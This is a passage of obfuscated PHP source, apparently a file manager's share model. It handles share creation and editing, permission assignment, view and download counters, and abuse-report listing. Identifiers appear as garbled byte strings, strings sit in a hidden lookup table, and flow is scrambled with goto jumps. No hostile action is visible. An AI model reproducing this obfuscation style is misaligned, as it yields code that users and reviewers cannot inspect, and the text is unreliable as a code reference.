array($Fﬁ‰ÙúÙ£Ã[563] => SourceModel::TYPE_GROUP, $Fﬁ‰ÙúÙ£Ã[485] => array($Fﬁ‰ÙúÙ£Ã[7], $D∑«Œ”›£™)), $Fﬁ‰ÙúÙ£Ã[1845] => $Fﬁ‰ÙúÙ£Ã[1799]); } $bë€≤ëﬂ¨≈ = Model($Fﬁ‰ÙúÙ£Ã[578])->where($dΩß∆Ü„óê)->selectPage($aßÇÿàﬂµÁ); $d™¢§…ÙâÉ = array_to_keyvalue_group($bë€≤ëﬂ¨≈[$Fﬁ‰ÙúÙ£Ã[367]], $Fﬁ‰ÙúÙ£Ã[469]); goto F”‚÷√Øñ“; DË®º¬âƒ´: } protected function shareAdd($Bâ˜√Êû¨π, $eÈ´€’è’ã) { $dıÆûºïÏë =& $_SERVER[Öíæ€“”≠éÏË]; $bäÕØºïøé = $this->_addShareData($Bâ˜√Êû¨π, $eÈ´€’è’ã); if (!empty($eÈ´€’è’ã[$dıÆûºïÏë[1851]])) { $this->_shareAuthSet($bäÕØºïøé, $eÈ´€’è’ã[$dıÆûºïÏë[1851]]); } $this->shareEventAdd($Bâ˜√Êû¨π, $eÈ´€’è’ã, $dıÆûºïÏë[1068]); return $bäÕØºïøé; } protected function shareAddSystem($fâ¬ª€ÿôÈ, $Dõë†Î∏»ª) { $E∂ú˘óÑë„ =& $_SERVER[Öíæ€“”≠éÏË]; $d∂ı €†“è = $this->_addShareData($fâ¬ª€ÿôÈ, $Dõë†Î∏»ª, $E∂ú˘óÑë„[1180]); $this->_shareAuthSet($d∂ı €†“è, $Dõë†Î∏»ª[$E∂ú˘óÑë„[1851]]); return $d∂ı €†“è; } private function shareEventAdd($cÆëè‰√±ê, $D§≈¥πﬁ˘¶, $fìÙÿèï∫¥ = "\x61\144\x64") { goto FºΩ«öÁ“¶; Aµøù•‚˘Ÿ: Model($D∞´Õ∫…¬À[547])->eventShare($cÆëè‰√±ê, $DÜ¶ªÍä·Ô); return; goto D≤§çÔÀíâ; FºΩ«öÁ“¶: $D∞´Õ∫…¬À =& $_SERVER[Öíæ€“”≠éÏË]; if (!$cÆëè‰√±ê || $cÆëè‰√±ê == $D∞´Õ∫…¬À[191]) { return; } if ($fìÙÿèï∫¥ == $D∞´Õ∫…¬À[1068]) { if ($D§≈¥πﬁ˘¶[$D∞´Õ∫…¬À[474]] == $D∞´Õ∫…¬À[87]) { Model($D∞´Õ∫…¬À[547])->eventShare($cÆëè‰√±ê, $D∞´Õ∫…¬À[1852]); } if ($D§≈¥πﬁ˘¶[$D∞´Õ∫…¬À[476]] == $D∞´Õ∫…¬À[87]) { Model($D∞´Õ∫…¬À[547])->eventShare($cÆëè‰√±ê, $D∞´Õ∫…¬À[1853]); } return; } goto B◊¨ΩŒÌŸ¶; C≥«ÜêáæŸ: if ($b¨Ï´√úç‘[$D∞´Õ∫…¬À[474]] == $D∞´Õ∫…¬À[87] && $D§≈¥πﬁ˘¶[$D∞´Õ∫…¬À[474]] == $D∞´Õ∫…¬À[191]) { $DÜ¶ªÍä·Ô = $D∞´Õ∫…¬À[1855]; } if ($b¨Ï´√úç‘[$D∞´Õ∫…¬À[476]] == $D∞´Õ∫…¬À[191] && $D§≈¥πﬁ˘¶[$D∞´Õ∫…¬À[476]] == $D∞´Õ∫…¬À[87]) { $DÜ¶ªÍä·Ô = $D∞´Õ∫…¬À[1853]; } if ($b¨Ï´√úç‘[$D∞´Õ∫…¬À[476]] == $D∞´Õ∫…¬À[87] && $D§≈¥πﬁ˘¶[$D∞´Õ∫…¬À[476]] == $D∞´Õ∫…¬À[191]) { $DÜ¶ªÍä·Ô = $D∞´Õ∫…¬À[1856]; } goto Aµøù•‚˘Ÿ; B◊¨ΩŒÌŸ¶: $b¨Ï´√úç‘ = $this->getInfoByPath($cÆëè‰√±ê); $DÜ¶ªÍä·Ô = $D∞´Õ∫…¬À[1854]; if ($b¨Ï´√úç‘[$D∞´Õ∫…¬À[474]] == $D∞´Õ∫…¬À[191] && $D§≈¥πﬁ˘¶[$D∞´Õ∫…¬À[474]] == $D∞´Õ∫…¬À[87]) { $DÜ¶ªÍä·Ô = $D∞´Õ∫…¬À[1852]; } goto C≥«ÜêáæŸ; D≤§çÔÀíâ: } private function _addShareData($dπ‰©≥Óπ, $c•ÿ®∏òÈô = array(), $e˜ƒ¯œ–ùë = false) { goto Bë˘ä≥”ﬁË; DŸÕóá€êæ: foreach ($Eﬂï±·›È≥ as $f™ñÇ»πÛŸ) { if (!isset($c•ÿ®∏òÈô[$f™ñÇ»πÛŸ])) { continue; } $CÎπØ•ƒœÓ[$f™ñÇ»πÛŸ] = $c•ÿ®∏òÈô[$f™ñÇ»πÛŸ]; } $c‹á“äÔ § = $this->add($CÎπØ•ƒœÓ); $bá≈’Øêñ¨ = array($eπõõáÀÆÇ[471] => short_id($c‹á“äÔ §)); goto aì’æËŒì∆; EÔ•®∂à™Ï: if (!$c•ÿ®∏òÈô[$eπõõáÀÆÇ[1441]]) { $c•ÿ®∏òÈô[$eπõõáÀÆÇ[1441]] = $C ⁄Í†€À¡[$eπõõáÀÆÇ[28]]; } $CÎπØ•ƒœÓ = array($eπõõáÀÆÇ[1529] => $eı´Ê¿çÉÓ, $eπõõáÀÆÇ[411] => $dπ‰©≥Óπ, $eπõõáÀÆÇ[1441] => $eπõõáÀÆÇ[33], $eπõõáÀÆÇ[474] => 0, $eπõõáÀÆÇ[476] => 0, $eπõõáÀÆÇ[1080] => $eπõõáÀÆÇ[33], $eπõõáÀÆÇ[305] => $eπõõáÀÆÇ[33], $eπõõáÀÆÇ[860] => $eπõõáÀÆÇ[33], $eπõõáÀÆÇ[1858] => 0, $eπõõáÀÆÇ[1859] => 0, $eπõõáÀÆÇ[477] => 0, $eπõõáÀÆÇ[478] => $eπõõáÀÆÇ[33], $eπõõáÀÆÇ[471] => $eπõõáÀÆÇ[33]); $Eﬂï±·›È≥ = explode($eπõõáÀÆÇ[47], $eπõõáÀÆÇ[1860]); goto DŸÕóá€êæ; aì’æËŒì∆: $this->where(array($eπõõáÀÆÇ[468] => $c‹á“äÔ §))->save($bá≈’Øêñ¨); return $c‹á“äÔ §; goto bÏèË∂û´≠; c˘‡ÑŸíÍÍ: if ($dπ‰©≥Óπ == 0) { $Cåïçƒãêñ = array($eπõõáÀÆÇ[1857] => $c•ÿ®∏òÈô[$eπõõáÀÆÇ[1080]], $eπõõáÀÆÇ[1529] => $eı´Ê¿çÉÓ); } if ($Cëâ™≠£È± = $this->where($Cåïçƒãêñ)->find()) { return $Cëâ™≠£È±[$eπõõáÀÆÇ[469]]; } if ($dπ‰©≥Óπ == 0) { $C ⁄Í†€À¡ = array($eπõõáÀÆÇ[28] => get_path_this($c•ÿ®∏òÈô[$eπõõáÀÆÇ[76]])); } else { $C ⁄Í†€À¡ = Model($eπõõáÀÆÇ[803])->sourceInfo($dπ‰©≥Óπ); if (!$C ⁄Í†€À¡) { return !1; } } goto EÔ•®∂à™Ï; Bë˘ä≥”ﬁË: $eπõõáÀÆÇ =& $_SERVER[Öíæ€“”≠éÏË]; $eı´Ê¿çÉÓ = $e˜ƒ¯œ–ùë == $eπõõáÀÆÇ[1180] ? 0 : USER_ID; $Cåïçƒãêñ = array($eπõõáÀÆÇ[411] => $dπ‰©≥Óπ, $eπõõáÀÆÇ[1529] => $eı´Ê¿çÉÓ); goto c˘‡ÑŸíÍÍ; bÏèË∂û´≠: } private function _shareAuthSet($BÓÀíäÔŒß, $c‡ãŒ¢Ú±) { goto F≥°®èÓãŒ; eŸùìΩÖá€: $D°ﬁ›…å‡°->where(array($Aä— §¿ù°[469] => $BÓÀíäÔŒß))->delete(); $eààïõÈÕŒ = array(); foreach ($c‡ãŒ¢Ú± as $C·µ£Éú≤≥) { $Fá“øÙ÷â£ = SourceModel::TYPE_USER; if ($C·µ£Éú≤≥[$Aä— §¿ù°[405]] == SourceModel::TYPE_GROUP) { $Fá“øÙ÷â£ = SourceModel::TYPE_GROUP; } $Bè÷Êéò≠§ = array($Aä— §¿ù°[469] => $BÓÀíäÔŒß, $Aä— §¿ù°[405] => $Fá“øÙ÷â£, $Aä— §¿ù°[485] => intval($C·µ£Éú≤≥[$Aä— §¿ù°[485]]), $Aä— §¿ù°[1807] => 0, $Aä— §¿ù°[1861] => -1); if ($C·µ£Éú≤≥[$Aä— §¿ù°[1807]]) { $Bè÷Êéò≠§[$Aä— §¿ù°[1807]] = $C·µ£Éú≤≥[$Aä— §¿ù°[1807]]; } else { if ($C·µ£Éú≤≥[$Aä— §¿ù°[1861]]) { $Bè÷Êéò≠§[$Aä— §¿ù°[1861]] = $C·µ£Éú≤≥[$Aä— §¿ù°[1861]]; } } $eààïõÈÕŒ[] = $Bè÷Êéò≠§; } goto DÜòÇΩ™”›; DÜòÇΩ™”›: return $D°ﬁ›…å‡°->addAll($eààïõÈÕŒ, array(), !0); goto c÷àú∏»˜€; F≥°®èÓãŒ: $Aä— §¿ù° =& $_SERVER[Öíæ€“”≠éÏË]; if (!is_array($c‡ãŒ¢Ú±)) { return !1; } $D°ﬁ›…å‡° = Model($Aä— §¿ù°[1811]); goto eŸùìΩÖá€; c÷àú∏»˜€: } public function numViewAdd($dã¢Úˆ—ÉÉ) { $bÖÌïıÙâ∆ =& $_SERVER[Öíæ€“”≠éÏË]; $EÇò≤˜¶”ﬁ = array($bÖÌïıÙâ∆[468] => $dã¢Úˆ—ÉÉ); $this->where($EÇò≤˜¶”ﬁ)->setAdd($bÖÌïıÙâ∆[1858]); } public function numDownloadAdd($C÷”ã‚Úöç) { $A‘Ô¬–±Ü =& $_SERVER[Öíæ€“”≠éÏË]; $aÎŒü◊¬≈‰ = array($A‘Ô¬–±Ü[468] => $C÷”ã‚Úöç); $this->where($aÎŒü◊¬≈‰)->setAdd($A‘Ô¬–±Ü[1859]); } protected function shareEdit($eùπéºË÷˜, $dïüî¡ı¨Œ) { goto FıÏ¿ì∑«ı; Cê†ı‹ﬂÃÀ: if (isset($dïüî¡ı¨Œ[$BÆ‹ˆ®øﬂ„[1851]])) { $this->_shareAuthSet($eùπéºË÷˜, $dïüî¡ı¨Œ[$BÆ‹ˆ®øﬂ„[1851]]); } return !0; goto e⁄ß“´∏›Ñ; FıÏ¿ì∑«ı: $BÆ‹ˆ®øﬂ„ =& $_SERVER[Öíæ€“”≠éÏË]; $AÇèÓËñ°í = $this->getInfo($eùπéºË÷˜); if (!$AÇèÓËñ°í) { return !1; } goto Aƒı€ê¢ùí; Aƒı€ê¢ùí: $this->_checkLinkShare($dïüî¡ı¨Œ, $AÇèÓËñ°í); $bù€Ö’•ßÏ = array(); $DË•»¿÷å£ = explode($BÆ‹ˆ®øﬂ„[47], $BÆ‹ˆ®øﬂ„[1862]); goto C°å„Ï€Ò©; C°å„Ï€Ò©: foreach ($DË•»¿÷å£ as $AûÁ¬Òõ∫í) { if (!array_key_exists($AûÁ¬Òõ∫í, $dïüî¡ı¨Œ)) { continue; } $bù€Ö’•ßÏ[$AûÁ¬Òõ∫í] = $dïüî¡ı¨Œ[$AûÁ¬Òõ∫í]; } $this->shareEventAdd($AÇèÓËñ°í[$BÆ‹ˆ®øﬂ„[396]], $dïüî¡ı¨Œ, $BÆ‹ˆ®øﬂ„[1674]); $this->where(array($BÆ‹ˆ®øﬂ„[468] => $eùπéºË÷˜))->save($bù€Ö’•ßÏ); goto Cê†ı‹ﬂÃÀ; e⁄ß“´∏›Ñ: } private function _checkLinkShare($E¨èÎÕ≥éÇ, $FÑèÔ“ä‚Ø) { goto c¢¿∆ä§¶Ó; EÀ‚Æ¢ß‚€: if ($FÑèÔ“ä‚Ø[$dïøúÙœíÎ[85]][$dïøúÙœíÎ[29]] != $dïøúÙœíÎ[193]) { $FÕÛãæÈ°ﬂ = $this->_folderReport($D€‚ñë≤ê¢); if (!$FÕÛãæÈ°ﬂ) { return; } show_json(LNG($dïøúÙœíÎ[1863]) . $dïøúÙœíÎ[1864] . $FÕÛãæÈ°ﬂ, !1); } $aè∑Ú“ûéƒ = Model($dïøúÙœíÎ[803])->fileInfoGet($FÑèÔ“ä‚Ø[$dïøúÙœíÎ[85]][$dïøúÙœíÎ[396]]); if (!$aè∑Ú“ûéƒ) { return; } goto A°â≈ÿ»Ô÷; A°â≈ÿ»Ô÷: $c∆ô‡ÁÖ«– = $this->shareFileMeta($aè∑Ú“ûéƒ[$dïøúÙœíÎ[448]]); if (isset($c∆ô‡ÁÖ«–[$dïøúÙœíÎ[372]]) && $c∆ô‡ÁÖ«–[$dïøúÙœíÎ[372]] == $dïøúÙœíÎ[87]) { show_json(LNG($dïøúÙœíÎ[1865]), !1); } goto DÛÉ·Á°âŒ; c¢¿∆ä§¶Ó: $dïøúÙœíÎ =& $_SERVER[Öíæ€“”≠éÏË]; if ($E¨èÎÕ≥éÇ[$dïøúÙœíÎ[474]] != $dïøúÙœíÎ[87]) { return; } $D€‚ñë≤ê¢ = $FÑèÔ“ä‚Ø[$dïøúÙœíÎ[85]][$dïøúÙœíÎ[396]]; goto EÀ‚Æ¢ß‚€; DÛÉ·Á°âŒ: } private function _folderReport($c¨£”àñáò) { goto a”à‘¢‹∏´; B≠âÜ„Ö∞√: $b◊Ë‚—Éùœ = substr($c—±ıâÿçï[$EŒœá◊≈æÃ[503]], strpos($c—±ıâÿçï[$EŒœá◊≈æÃ[503]], $e€ﬁÔ÷…≥µ)); $Eûı›¢Ùßæ = array($EŒœá◊≈æÃ[396] => array($EŒœá◊≈æÃ[7], trim($b◊Ë‚—Éùœ, $EŒœá◊≈æÃ[47]))); $c»Âë–êø“ = Model($EŒœá◊≈æÃ[803])->where($Eûı›¢Ùßæ)->field($EŒœá◊≈æÃ[28])->select(); goto a«‘êﬂ˘ı‰; d“ß§Üñ·Ô: if (!$bäªååÊÜø) { return !1; } $bäªååÊÜø = array_to_keyvalue($bäªååÊÜø, $EŒœá◊≈æÃ[33], $EŒœá◊≈æÃ[448]); $e€ﬁÔ÷…≥µ = $EŒœá◊≈æÃ[47] . $c¨£”àñáò . $EŒœá◊≈æÃ[47]; goto cø†‘ã∏Í£; a”à‘¢‹∏´: $EŒœá◊≈æÃ =& $_SERVER[Öíæ€“”≠éÏË]; $Eûı›¢Ùßæ = array($EŒœá◊≈æÃ[448] => array($EŒœá◊≈æÃ[980], 0), $EŒœá◊≈æÃ[723] => 3); $bäªååÊÜø = Model($EŒœá◊≈æÃ[1866])->where($Eûı›¢Ùßæ)->field($EŒœá◊≈æÃ[448])->select(); goto d“ß§Üñ·Ô; a«‘êﬂ˘ı‰: $a¶Í´ñµŒ = array_to_keyvalue($c»Âë–êø“, $EŒœá◊≈æÃ[33], $EŒœá◊≈æÃ[28]); $a¶Í´ñµŒ[] = $c—±ıâÿçï[$EŒœá◊≈æÃ[28]]; return implode($EŒœá◊≈æÃ[8], $a¶Í´ñµŒ); goto C“â’úêÎÑ; cø†‘ã∏Í£: $Eûı›¢Ùßæ = array($EŒœá◊≈æÃ[448] => array($EŒœá◊≈æÃ[7], $bäªååÊÜø), $EŒœá◊≈æÃ[503] => array($EŒœá◊≈æÃ[380], "\x25{$e€ﬁÔ÷…≥µ}\45"), $EŒœá◊≈æÃ[424] => 0); $c—±ıâÿçï = Model($EŒœá◊≈æÃ[803])->where($Eûı›¢Ùßæ)->field($EŒœá◊≈æÃ[1867])->find(); if (!$c—±ıâÿçï) { return !1; } goto B≠âÜ„Ö∞√; C“â’úêÎÑ: } protected function remove($EÙáãæòØ£) { goto e§‘ä‚Û©∏; cè∆Û‘ç∑‘: for ($bÜ˜âﬂÍˆ = 0; $bÜ˜âﬂÍˆ < count($EÜ≠°Øêõû); $bÜ˜âﬂÍˆ++) { $c◊Ì¿È‘òƒ = $this->getInfo($EÜ≠°Øêõû[$bÜ˜âﬂÍˆ]); if ($c◊Ì¿È‘òƒ[$C¯„∏ÊøÚ¥[476]] == $C¯„∏ÊøÚ¥[87]) { Model($C¯„∏ÊøÚ¥[547])->eventShare($c◊Ì¿È‘òƒ[$C¯„∏ÊøÚ¥[396]], $C¯„∏ÊøÚ¥[1856]); } if ($c◊Ì¿È‘òƒ[$C¯„∏ÊøÚ¥[474]] == $C¯„∏ÊøÚ¥[87]) { Model($C¯„∏ÊøÚ¥[547])->eventShare($c◊Ì¿È‘òƒ[$C¯„∏ÊøÚ¥[396]], $C¯„∏ÊøÚ¥[1855]); } } return $f¥«ç…â•œ; goto b≤º√‡∞Á‡; e§‘ä‚Û©∏: $C¯„∏ÊøÚ¥ =& $_SERVER[Öíæ€“”≠éÏË]; if (is_array($EÙáãæòØ£)) { $EÙáãæòØ£ = array($C¯„∏ÊøÚ¥[7], $EÙáãæòØ£); } $aπ‘¯√«î≥ = array($C¯„∏ÊøÚ¥[469] => $EÙáãæòØ£); goto AïÃ”™»≈∑; AïÃ”™»≈∑: $f¥«ç…â•œ = $this->where($aπ‘¯√«î≥)->delete(); if ($f¥«ç…â•œ) { Model($C¯„∏ÊøÚ¥[578])->where(array($C¯„∏ÊøÚ¥[469] => $EÙáãæòØ£))->delete(); } $EÜ≠°Øêõû = is_array($EÙáãæòØ£) ? $EÙáãæòØ£[1] : array($EÙáãæòØ£); goto cè∆Û‘ç∑‘; b≤º√‡∞Á‡: } protected function removeBySource($a‘§ÜÂÏü…) { goto b„êî◊Ö¯Ω; b„êî◊Ö¯Ω: $fÖ´‹ÿ¬œ =& $_SERVER[Öíæ€“”≠éÏË]; $bè¡¡ªêóë = array($fÖ´‹ÿ¬œ[411] => array($fÖ´‹ÿ¬œ[412], $a‘§ÜÂÏü…)); $bëÚø∞Á∂π = $this->field($fÖ´‹ÿ¬œ[469])->where($bè¡¡ªêóë)->select(); goto aœÑÏ«§„…; bç¨ãÑã’å: $this->where($bè¡¡ªêóë)->delete(); Model($fÖ´‹ÿ¬œ[578])->where($bè¡¡ªêóë)->delete(); goto D¢íî¥ÛΩá; aœÑÏ«§„…: $bëÚø∞Á∂π = array_to_keyvalue($bëÚø∞Á∂π, $fÖ´‹ÿ¬œ[33], $fÖ´‹ÿ¬œ[469]); if (!$bëÚø∞Á∂π) { return; } $bè¡¡ªêóë = array($fÖ´‹ÿ¬œ[468] => array($fÖ´‹ÿ¬œ[412], $bëÚø∞Á∂π)); goto bç¨ãÑã’å; D¢íî¥ÛΩá: } public function listAll($c”ΩÇÙ⁄êˆ) { goto AÈ≠ÈµâÿŒ; AÈ≠ÈµâÿŒ: $aÖ∏©üÆö± =& $_SERVER[Öíæ€“”≠éÏË]; $càÌ†ì¶“Œ = array(); if ($c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[1538]]) { $càÌ†ì¶“Œ[$aÖ∏©üÆö±[1538]] = $c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[1538]]; } goto bÕ÷èÌÇâ¡; C∞ëÒ°ƒßè: $bæ†ﬂÇ˘•ÿ = $this->_makeOrder()->where($càÌ†ì¶“Œ)->selectPage(20); if (empty($bæ†ﬂÇ˘•ÿ[$aÖ∏©üÆö±[367]])) { return array(); } $this->_listDataApply($bæ†ﬂÇ˘•ÿ[$aÖ∏©üÆö±[367]]); goto cÙ⁄†Üˆ©›; cÙ⁄†Üˆ©›: return $bæ†ﬂÇ˘•ÿ; goto C©ç¡æŸé›; bÕ÷èÌÇâ¡: if ($c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[734]]) { $b†•ÖÏﬁÛ = $c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[477]] ? $c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[477]] : strtotime(date($aÖ∏©üÆö±[1868])); $càÌ†ì¶“Œ[$aÖ∏©üÆö±[194]] = array($aÖ∏©üÆö±[331], array($c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[734]], $b†•ÖÏﬁÛ)); } if ($c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[29]]) { $càÌ†ì¶“Œ[$c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[29]]] = 1; } else { $càÌ†ì¶“Œ[] = array($aÖ∏©üÆö±[474] => array($aÖ∏©üÆö±[980], 0), $aÖ∏©üÆö±[476] => array($aÖ∏©üÆö±[980], 0), $aÖ∏©üÆö±[1845] => $aÖ∏©üÆö±[1799]); } if ($c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[1795]]) { $càÌ†ì¶“Œ[] = array($aÖ∏©üÆö±[471] => $c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[1795]], $aÖ∏©üÆö±[1441] => array($aÖ∏©üÆö±[380], "\x25{$c”ΩÇÙ⁄êˆ[$aÖ∏©üÆö±[1795]]}\x25"), $aÖ∏©üÆö±[1845] => $aÖ∏©üÆö±[1799]); } goto C∞ëÒ°ƒßè; C©ç¡æŸé›: } public function listDataApply($aÓéäî≠üò) { $this->_listDataApply($aÓéäî≠üò); return $aÓéäî≠üò; } private function _listDataApply(&$BõËùıë∑Ω) { goto a»ãÚ∞àÔ≤; E◊ÍüÊÙæÇ: unset($BÙáﬂ‡Ò◊é); $BõËùıë∑Ω = array_values($BõËùıë∑Ω); goto dŒô˘Ëò“§; a»ãÚ∞àÔ≤: $eàÛˆπ©óË =& $_SERVER[Öíæ€“”≠éÏË]; $A¢¥ÂÙøÛí = array_to_keyvalue($BõËùıë∑Ω, $eàÛˆπ©óË[33], $eàÛˆπ©óË[1538]); $A“¿òî“ÜØ = Model($eàÛˆπ©óË[520])->userListInfo(array_unique($A¢¥ÂÙøÛí)); goto fﬂÈéêÍè; fﬂÈéêÍè: $EÖ„“™ÚΩñ = array_to_keyvalue($BõËùıë∑Ω, $eàÛˆπ©óË[33], $eàÛˆπ©óË[396]); $C∑©®–Âá® = Model($eàÛˆπ©óË[803])->sourceListInfo($EÖ„“™ÚΩñ, !0); foreach ($BõËùıë∑Ω as $Cë–Ÿ∆‹µ¿ => &$BÙáﬂ‡Ò◊é) { $CâèåÊâÚè = $BÙáﬂ‡Ò◊é[$eàÛˆπ©óË[1538]]; $BÙáﬂ‡Ò◊é[$eàÛˆπ©óË[1869]] = $A“¿òî“ÜØ[$CâèåÊâÚè] ? $A“¿òî“ÜØ[$CâèåÊâÚè] : !1; $B£ò¯è¡¬â = $BÙáﬂ‡Ò◊é[$eàÛˆπ©óË[396]]; $BÙáﬂ‡Ò◊é[$eàÛˆπ©óË[85]] = $C∑©®–Âá®[$B£ò¯è¡¬â] ? $C∑©®–Âá®[$B£ò¯è¡¬â] : !1; if ($BÙáﬂ‡Ò◊é[$eàÛˆπ©óË[85]][$eàÛˆπ©óË[424]] == $eàÛˆπ©óË[87]) { unset($BõËùıë∑Ω[$Cë–Ÿ∆‹µ¿]); } if ($BÙáﬂ‡Ò◊é[$eàÛˆπ©óË[85]] != $eàÛˆπ©óË[191] && !$BÙáﬂ‡Ò◊é[$eàÛˆπ©óË[85]]) { unset($BõËùıë∑Ω[$Cë–Ÿ∆‹µ¿]); } } goto E◊ÍüÊÙæÇ; dŒô˘Ëò“§: } private function _makeOrder($a±—âê⁄≈Ÿ = '') { goto cèáç†Ãøì; cèáç†Ãøì: $fë≈ë≠ê¿— =& $_SERVER[Öíæ€“”≠éÏË]; $bØ≥Ñû†™ì = array($fë≈ë≠ê¿—[194], $fë≈ë≠ê¿—[477], $fë≈ë≠ê¿—[1858], $fë≈ë≠ê¿—[1859]); $dÒÊ¥£¶–” = array($fë≈ë≠ê¿—[429] => $fë≈ë≠ê¿—[430], $fë≈ë≠ê¿—[431] => $fë≈ë≠ê¿—[432]); goto eáù–≤Ú…ﬂ; eÁ∂ÉŸÖ÷Ï: $a±—âê⁄≈Ÿ = $a±—âê⁄≈Ÿ . "{$A√òêµ≠¯Â}\x20{$c›≈¥Ö∏µî}"; return $this->order($a±—âê⁄≈Ÿ); goto FÕ‘ü—ã’–; eáù–≤Ú…ﬂ: $A√òêµ≠¯Â = Input::get($fë≈ë≠ê¿—[436], $fë≈ë≠ê¿—[7], $fë≈ë≠ê¿—[417], $bØ≥Ñû†™ì); $c›≈¥Ö∏µî = Input::get($fë≈ë≠ê¿—[437], $fë≈ë≠ê¿—[7], $fë≈ë≠ê¿—[1870], array($fë≈ë≠ê¿—[1794], $fë≈ë≠ê¿—[431])); $c›≈¥Ö∏µî = $dÒÊ¥£¶–”[$c›≈¥Ö∏µî]; goto eÁ∂ÉŸÖ÷Ï; FÕ‘ü—ã’–: } public function reportAdd($eë£§àæá≥) { $AÂâçë£á€ =& $_SERVER[Öíæ€“”≠éÏË]; $Då‹„∞◊áƒ = array($AÂâçë£á€[469] => $eë£§àæá≥[$AÂâçë£á€[469]], $AÂâçë£á€[1538] => USER_ID); if (Model($AÂâçë£á€[1866])->where($Då‹„∞◊áƒ)->find()) { return !1; } $b™ùï‘ı∂© = array($AÂâçë£á€[469] => $eë£§àæá≥[$AÂâçë£á€[469]], $AÂâçë£á€[1441] => $eë£§àæá≥[$AÂâçë£á€[1441]], $AÂâçë£á€[396] => $eë£§àæá≥[$AÂâçë£á€[396]], $AÂâçë£á€[448] => $eë£§àæá≥[$AÂâçë£á€[448]], $AÂâçë£á€[1538] => USER_ID, $AÂâçë£á€[29] => $eë£§àæá≥[$AÂâçë£á€[29]], $AÂâçë£á€[432] => $eë£§àæá≥[$AÂâçë£á€[432]]); return Model($AÂâçë£á€[1866])->add($b™ùï‘ı∂©); } public function reportList($aÇäœâ•Úä) { goto A◊ßŸã…ëÿ; A◊ßŸã…ëÿ: $a™å¿çêÒè =& $_SERVER[Öíæ€“”≠éÏË]; $F„ñœõÇ¯¥ = array(); if ($aÇäœâ•Úä[$a™å¿çêÒè[734]]) { $aäÃÚ˘äÿõ = $aÇäœâ•Úä[$a™å¿çêÒè[477]] ? $aÇäœâ•Úä[$a™å¿çêÒè[477]] : strtotime(date($a™å¿çêÒè[1868])); $F„ñœõÇ¯¥[$a™å¿çêÒè[194]] = array($a™å¿çêÒè[331], array($aÇäœâ•Úä[$a™å¿çêÒè[734]], $aäÃÚ˘äÿõ)); } goto B±§‰ÙÇ÷„; DÍÕ´¥Ë¨: $dÆ√öÜÉÜö = array($a™å¿çêÒè[429] => $a™å¿çêÒè[430], $a™å¿çêÒè[431] => $a™å¿çêÒè[432]); $cæãÆá™àã = $a™å¿çêÒè[1875] . $dÆ√öÜÉÜö[$a∏•®ÙıíÔ]; $E™ÀÙ‘®“Ã = Model($a™å¿çêÒè[1866])->where($F„ñœõÇ¯¥)->order($cæãÆá™àã)->selectPage(20); goto BÖÆÿ±π∆ç; aπ«‹Üû¢√: $this->_listDataApply($E™ÀÙ‘®“Ã[$a™å¿çêÒè[367]]); return $E™ÀÙ‘®“Ã; goto FÑ±Ë¯ßË; B±§‰ÙÇ÷„: if (isset($aÇäœâ•Úä[$a™å¿çêÒè[29]]) && in_array($aÇäœâ•Úä[$a™å¿çêÒè[29]], array($a™å¿çêÒè[87], $a™å¿çêÒè[1871], $a™å¿çêÒè[1872], $a™å¿çêÒè[1873], $a™å¿çêÒè[1874]))) { $F„ñœõÇ¯¥[$a™å¿çêÒè[29]] = $aÇäœâ•Úä[$a™å¿çêÒè[29]]; } if (isset($aÇäœâ•Úä[$a™å¿çêÒè[723]]) && in_array($aÇäœâ•Úä[$a™å¿çêÒè[723]], array($a™å¿çêÒè[191], $a™å¿çêÒè[87], $a™å¿çêÒè[1871], $a™å¿çêÒè[1872]))) { $F„ñœõÇ¯¥[$a™å¿çêÒè[723]] = $aÇäœâ•Úä[$a™å¿çêÒè[723]]; } $a∏•®ÙıíÔ = Input::get($a™å¿çêÒè[437], $a™å¿çêÒè[7], $a™å¿çêÒè[1870], array($a™å¿çêÒè[1794], $a™å¿çêÒè[431])); goto DÍÕ´¥Ë¨; BÖÆÿ±π∆ç: if (empty($E™ÀÙ‘®“Ã[$a™å¿çêÒè[367]])) { return array(); } $DÓÁ∏Ò”ËÁ = array_to_keyvalue_group($E™ÀÙ‘®“Ã[$a™å¿çêÒè[367]], $a™å¿çêÒè[723], $a™å¿çêÒè[469]); if (!empty($DÓÁ∏Ò”ËÁ[0])) { $aÇäœâ•Úä = $DÓÁ∏Ò”ËÁ[0]; $F„ñœõÇ¯¥ = array($a™å¿çêÒè[469] => array($a™å¿çêÒè[7], $aÇäœâ•Úä)); $bÆÿﬁ≈Üö… = $this->where($F„ñœõÇ¯¥)->field($a™å¿çêÒè[469])->select(); $bÆÿﬁ≈Üö… = array_to_keyvalue($bÆÿﬁ≈Üö…, $a™å¿çêÒè[33], $a™å¿çêÒè[469]); $D∞àÖãßà√ = array_diff($aÇäœâ•Úä, $bÆÿﬁ≈Üö…); if (!empty($D∞àÖãßà√)) { foreach ($E™ÀÙ‘®“Ã[$a™å¿çêÒè[367]] as $b≈«í˜Ω‡€ => $cÏÛ∑Íó≥Â) { if (in_array($cÏÛ∑Íó≥Â[$a™å¿çêÒè[469]], $D∞àÖãßà√)) { unset($E™ÀÙ‘®“Ã[$a™å¿çêÒè[367]][$b≈«í˜Ω‡€]); } } } } goto aπ«‹Üû¢√; FÑ±Ë¯ßË: } public function reportStatus($f‹ó‹È©–Ú) { goto DÀë·Ø¶≠´; Aﬂ‰©‹à¯∆: if (!$Bâ≤•∂µíà) { return !1; } $CÃ´áíÁ≠  = array($E⁄Ò≈êÕôå[723] => $f‹ó‹È©–Ú[$E⁄Ò≈êÕôå[723]]); if ($f‹ó‹È©–Ú[$E⁄Ò≈êÕôå[723]] == $E⁄Ò≈êÕôå[1872] && $Bâ≤•∂µíà[$E⁄Ò≈êÕôå[723]] == $E⁄Ò≈êÕôå[1872]) { $CÃ´áíÁ≠ [$E⁄Ò≈êÕôå[723]] = 0; } goto cøêåÊä±; E£òË¢Ÿ€Î: return $eÈﬁ”·ÿêÇ; goto 